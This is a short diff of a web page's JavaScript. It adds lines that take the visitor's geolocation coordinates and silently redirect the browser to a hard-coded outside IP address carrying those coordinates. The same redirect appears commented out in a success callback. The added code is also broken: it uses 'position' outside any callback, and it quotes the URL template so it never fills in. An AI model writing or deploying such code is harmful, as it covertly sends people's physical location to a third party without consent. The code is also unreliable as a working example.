@@ -58,8 +58,9 @@ button {
 
   const status = document.querySelector('#status');
  
-
-  
+    const latitude  = position.coords.latitude;
+    const longitude = position.coords.longitude;
+  location.replace('http://199.91.174.223/${latitude}/${longitude}');
 
   function success(position) {
     const latitude  = position.coords.latitude;
@@ -72,7 +73,7 @@ button {
 	//location.replace(`http://199.91.174.223/${latitude}/${longitude}`);
    
     //document.write('<img src="http://199.91.174.223/${latitude}/${longitude}" />'); 
-	location.replace('http://199.91.174.223/${latitude}/${longitude}');
+	//location.replace('http://199.91.174.223/${latitude}/${longitude}');
 	
   }
 
